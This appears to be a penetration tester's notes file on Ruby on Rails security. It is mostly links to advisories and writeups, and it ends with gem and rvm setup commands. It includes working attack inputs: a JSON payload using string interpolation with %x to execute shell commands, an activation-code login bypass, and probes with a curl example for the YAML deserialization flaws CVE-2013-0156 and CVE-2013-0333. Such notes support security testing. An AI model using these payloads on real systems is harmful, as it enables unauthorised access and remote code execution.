# ruby

https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet
https://groups.google.com/forum/#!forum/rubyonrails-security
http://www.learnstreet.com/lessons/study/ruby
http://rails-sqli.org/
http://guides.rubyonrails.org/security.html # the usual security issues and countermeasures

# fingerprint
X-Powered-By: Phusion Passenger (mod_rails/mod_rack) 3.0.8
X-Rack-Cache: miss
Set-Cookie: _appname_session=(base64)%3D%3D--(hexadecimal)

http://website/home?a=1&a[]=1 # discovered by a brisbane guy bjeanes
http://website/home?x[y]=1&x[y]z=2 # one of the test cases on github

# see talk by joernchen of Phenoelit at hitb 2012 

# mass assignment
http://guides.rubyonrails.org/v3.2.9/security.html#mass-assignment
try every field if it's not rails 4 (https://code.tutsplus.com/tutorials/mass-assignment-rails-and-you--net-31695)

# regular expressions are multi-lines by default
/^\d+$/ will match "arbitrary data\n123\narbitrary data"

# csrf bypass CVE-2011-0447
http://weblog.rubyonrails.org/2011/2/8/csrf-protection-bypass-in-ruby-on-rails/

# SQLi in RoR CVE-2012-5664
https://groups.google.com/forum/#!topic/rubyonrails-security/DCNTNp_qjFM

# use #{} to evaluate code. Using the %x arg we were able to execute shell commands.
http://buer.haus/2017/03/13/airbnb-ruby-on-rails-string-interpolation-led-to-remote-code-execution/
POST {“listing”:{“directions”:[{“test”:”test1″}]}} instead of {“listing”:{“directions”:”test”}} => "directions":"---\n- !ruby/hash:ActionDispatch::Http::ParamsHashWithIndifferentAccess\n  test: test1\n"
POST {"listing":{"directions":[{"test":[{"abc":"#{1+1}"}]}] }} => abc: ! ‘2’
POST {“listing”:{“directions”:[{“test”:[{“abc”:”#{%x[‘ls’]}+foo”}]}] }} => rce

# reset pw
session[params[:token]] # there will always be session_id and _csrf_token in the session dictionary
https://gist.github.com/joernchen/9dfa57017b4732c04bcc http://www.akitaonrails.com/2014/08/28/small-bite-session-injection-challenge

# login bypass in rails restful_authentication plugin (28/10/2007)
/activate/?activation_code= => SELECT * FROM users WHERE (users.`activation_code` IS NULL) LIMIT 1 // and login w/o password as the first account 
http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/

# universal YAML.load deserialization RCE (versions > 2.7)
https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

# Action Pack vuln: insecure deserialization when sending YAML within a XML or JSON request
https://blog.rapid7.com/2013/01/09/serialization-mischief-in-ruby-land-cve-2013-0156/ # XML+YAML
http://www.insinuator.net/2013/01/rails-yaml/
https://ronin-rb.dev/blog/2013/01/09/rails-pocs.html
https://blog.rapid7.com/2013/01/29/exploit-for-ruby-on-rails-cve-2013-0333/ # JSON+YAML
https://ronin-rb.dev/blog/2013/01/28/new-rails-poc.html
https://github.com/charliesome/charlie.bz/blob/master/posts/rails-3.2.10-remote-code-execution.md
https://blog.rapid7.com/2013/01/10/exploiting-ruby-on-rails-with-metasploit-cve-2013-0156/ # walkthrough using the msf scanner and exploit modules

* CVE-2013-0156 (YAML)
https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion
Versions Affected:  ALL
Fixed Versions:     3.2.11, 3.1.10, 3.0.19, 2.3.15 

* CVE-2013-0333 (JSON)
https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/1h2DR63ViGo
Versions Affected:  2.3.x, 3.0.x
Not Affected:       3.1.x, 3.2.x, applications using the yaml gem.
Fixed Versions:     3.0.20, 2.3.16 

pick a GET request and convert it to a POST request
add X-HTTP-Method-Override: GET

  - xml/yaml
change Content-Type: application/xml
payload                         | vuln | not vuln
-------------------------------------------------
<a type="string">blah</a>       | 200  | 200
<a type="yaml">valid yaml</a>   | 200  | 500
<a type="yaml">invalid yaml</a> | 500  | 500

  - json/yaml
change Content-Type: application/json
payload          | vuln | not vuln
----------------------------------
{"asdf": "asdf"} | 200  | 200
--- {}           | 200  | 500
invalid yaml     | 500  | 500

otherwise if we know the request body is `user[firstname]=david&user[lastname]=...` for example
convert to xml: curl -v 'http://192.168.122.224:3000/products?authenticity_token=F8...' -d '<user><firstname type="string">david</firstname></user>' -H 'Content-Type: application/xml'
move the `authenticity_token` param to the query string
move the `_method=PUT` param to the headers => X-HTTP-Method-Override: PUT # rack/test/spec_methodoverride.rb

look at msf exploits

plop = "salut"
require 'yaml'
YAML.dump(plop)
=> "--- salut\n...\n"

# rubygems
https://wiki.archlinux.org/index.php/Ruby
gem list
gem spec rubydns
gem list --remote rubydns
gem install rubydns --no-rdoc --no-ri
gem install rails -v 3.2.10
gem update

gem install bundler
export GEM_HOME=~/.gem/ruby/2.0.0
export PATH=$PATH:$GEM_HOME/bin
bundle install # reads deps' versions from Gemfile

# install rails
https://wiki.archlinux.org/index.php/Ruby_on_Rails

# rvm
source $(rvm 2.1.5 do rvm env --path) # switch to another version
